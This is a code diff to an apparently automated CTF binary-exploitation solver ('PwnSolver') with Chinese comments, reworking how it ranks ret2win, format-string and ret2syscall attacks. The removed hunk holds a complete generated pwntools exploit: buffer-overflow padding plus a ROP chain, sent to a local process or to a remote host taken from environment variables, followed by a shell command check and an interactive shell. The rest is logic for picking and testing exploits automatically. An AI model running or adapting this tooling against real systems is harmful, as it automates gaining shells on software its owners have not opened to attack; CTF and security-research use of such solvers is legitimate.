@@ -185,6 +185,8 @@ class PwnSolver:
         candidates = []
         
         # 1. ret2win - 最高优先级（显式+推断win函数）
+        # 但需要确认有实际的溢出风险（gets/scanf等不限制输入的函数）
+        # fgets(buf, size, stdin) 是有界的，不构成栈溢出
         real_win = [(n, a) for n, a in funcs.get('win', [])
                     if not n.endswith('.c') and 'plt.' not in n and 'got.' not in n
                     and not n.startswith('_')]
@@ -194,14 +196,28 @@ class PwnSolver:
         has_binsh = funcs.get('has_binsh', False)
         pie_enabled = protections.get('pie', False)
         
-        if real_win:
-            # PIE启用时win地址只是偏移量，需要先leak PIE base
+        # 检测是否有无界输入函数（真正的溢出风险）
+        unbounded_funcs = {'gets', 'scanf', 'read', 'strcpy', 'strcat', 'sprintf', 'memcpy'}
+        danger_names = {n.split('.')[-1].lower() for n, _ in funcs.get('dangerous', [])}
+        has_real_overflow = bool(unbounded_funcs & danger_names)
+        # fgets 有界但也可与格式字符串结合，所以不能完全排除
+        is_fgets_only = danger_names == {'fgets'} or (danger_names <= {'fgets', 'printf'})
+        
+        if real_win and has_real_overflow:
             confidence = 60 if pie_enabled else 100
             reason = f'存在win函数: {real_win[0][0]}'
             if pie_enabled:
                 reason += ' (PIE→需leak)'
             candidates.append(('ret2win', confidence, reason))
             self.log(f"  [+] 候选: ret2win (置信度: {'需PIE leak' if pie_enabled else '最高'}) - {real_win[0][0]} @ {real_win[0][1]}")
+        elif real_win and is_fgets_only:
+            # 有win但只有fgets（有界输入），更多可能是格式字符串或其他
+            self.log(f"  [!] 降级ret2win → format_string (有界输入+fgets, win={real_win[0][0]})")
+            # 不添加ret2win，让format_string候选生效
+        elif real_win and not has_real_overflow:
+            # 有win但没有明显溢出 → 降低置信度
+            candidates.append(('ret2win', 40, f'win存在但溢出路径不明: {real_win[0][0]}'))
+            self.log(f"  [+] 候选: ret2win (置信度: 低) - win存在但溢出路径不明")
         elif implied_win:
             # stripped但推断出win路径
             candidates.append(('ret2win', 92, f'推断win路径: {implied_win[0][0]}'))
@@ -228,10 +244,16 @@ class PwnSolver:
                 candidates.append(('ret2libc', 50, 'NX+溢出但无pop_rdi'))
                 self.log(f"  [+] 候选: ret2libc (置信度: 低) - 无pop_rdi!")
         
-        # 4. format_string
+        # 4. format_string — 升级: 有win但无溢出→fmtstr写secret触发win
         if 'printf' in str(funcs.get('dangerous', [])):
-            candidates.append(('format_string', 60, '存在printf调用'))
-            self.log(f"  [+] 候选: format_string (置信度: 中)")
+            fmt_confidence = 60
+            fmt_reason = '存在printf调用'
+            # 如果有win但溢出路径不明, format_string可能是正确路径
+            if real_win and not has_real_overflow:
+                fmt_confidence = 85
+                fmt_reason += ' + win函数(无溢出→fmtstr写变量)'
+            candidates.append(('format_string', fmt_confidence, fmt_reason))
+            self.log(f"  [+] 候选: format_string (置信度: {'高' if fmt_confidence >= 80 else '中'}) - {fmt_reason}")
         
         # 5. shellcode
         if has_dangerous and not protections.get('nx', True):
@@ -450,6 +472,17 @@ class PwnSolver:
                     self._print_success("ret2win")
                     return True
             
+            # 3a2: ret2syscall (binary有syscall+pop_rax+pop_rdi时优先，不需要libc)
+            specific = gadgets.get('specific', {})
+            has_syscall_gadgets = specific.get('syscall') and specific.get('pop_rax') and specific.get('pop_rdi')
+            if has_syscall_gadgets and has_overflow:
+                self.log("  尝试ret2syscall (binary内gadget, 无需libc)...")
+                self.vuln_type = ('ret2syscall', 88, 'binary有完整syscall链')
+                code = self.generate_exploit(analysis, gadgets)
+                if code and self.test_exploit():
+                    self._print_success("ret2syscall (binary gadgets)")
+                    return True
+            
             # 3b: one_gadget (无seccomp时)
             if gadgets.get('one_gadgets') and not has_seccomp:
                 self.vuln_type = ('one_gadget', 95, '')
@@ -493,88 +526,14 @@ class PwnSolver:
                     self._print_success("ret2libc")
                     return True
             
-            # 4c: ret2syscall (s.s.a.l风格 - 不需要libc)
-            specific = gadgets.get('specific', {})
+            # 4c: ret2syscall (fallback, 使用exploit模板)
             if specific.get('syscall') and specific.get('pop_rax') and specific.get('pop_rdi'):
-                self.log("  尝试ret2syscall (s.s.a.l风格)...")
-                try:
-                    from gadget_finder import GadgetFinder
-                    gf = GadgetFinder(self.binary_path, self.libc_path, verbose=False)
-                    chain_info = gf.generate_ret2syscall_chain()
-                    if 'error' not in chain_info:
-                        # 内联生成 ret2syscall exploit
-                        import textwrap
-                        offset = 0x58  # 默认栈帧
-                        for b in analysis.get('buffers', []):
-                            if b.get('type') == 'stack_frame':
-                                offset = b['size'] + 8
-                                break
-                        chain_hex = ', '.join([f'0x{b:02x}' for b in chain_info['chain']])
-                        code = textwrap.dedent(f'''\
-#!/usr/bin/env python3
-"""Ret2Syscall Exploit — Auto-generated"""
-from pwn import *
-context.arch = 'amd64'
-context.log_level = 'info'
-import os as _os, atexit as _atexit, glob as _glob
-def _cleanup_cores():
-    for _cf in _glob.glob('core') + _glob.glob('core.*') + _glob.glob('cores/core.*'):
-        try: _os.remove(_cf)
-        except: pass
-_atexit.register(_cleanup_cores)
-
-BINARY = {repr(self.binary_path)}
-REMOTE_HOST = None; REMOTE_PORT = 0
-_env_host = _os.environ.get('PWN_REMOTE_HOST', '')
-if _env_host:
-    REMOTE_HOST = _env_host
-    try: REMOTE_PORT = int(_os.environ.get('PWN_REMOTE_PORT', '0'))
-    except: pass
-def conn():
-    if REMOTE_HOST: return remote(REMOTE_HOST, REMOTE_PORT)
-    return process(BINARY)
-
-p = conn()
-try: p.recv(timeout=1)
-except: pass
-payload = b'A' * {offset} + bytes([{chain_hex}])
-p.send(payload)
-import time; time.sleep(0.5)
-p.sendline(b'echo PWNED_OK && id')
-time.sleep(0.3)
-try:
-    output = p.recv(timeout=2)
-    if b'PWNED_OK' in output:
-        print(output.decode(errors='ignore'))
-        p.interactive()
-except EOFError:
-    output = p.recvall(timeout=2)
-    print(output.decode(errors='ignore'))
-p.close()
-''')
-                        from exploit_templates import BaseExploit
-                        class _R2S(BaseExploit):
-                            def __init__(self):
-                                self.code = code
-                                self.binary_path = self.binary_path
-                                self.verbose = self.verbose
-                            def log(self, msg): pass
-                        # 注入到self用于测试
-                        exp = BaseExploit.__new__(BaseExploit)
-                        exp.code = code
-                        exp.binary_path = self.binary_path
-                        exp.verbose = self.verbose
-                        exp.log = lambda m: None
-                        self.exploit = exp
-                        if self.test_exploit():
-                            self._print_success("ret2syscall")
-                            return True
-                        self.log("  ret2syscall测试失败，继续...")
-                    else:
-                        self.log(f"  ret2syscall链: {chain_info.get('error','?')}")
-                except Exception as e:
-                    self.log(f"  ret2syscall失败: {e}")
-            
+                self.log("  尝试ret2syscall (exploit模板)...")
+                self.vuln_type = ('ret2syscall', 75, 'fallback')
+                code = self.generate_exploit(analysis, gadgets)
+                if code and self.test_exploit():
+                    self._print_success("ret2syscall")
+                    return True
             # 4d: setcontext+ORW (Heap_Harmony_Festivity风格)
             heap_menu = analysis.get('heap_menu') or funcs.get('heap_menu') or {}
             if heap_menu.get('heap_menu') and self.libc_path:
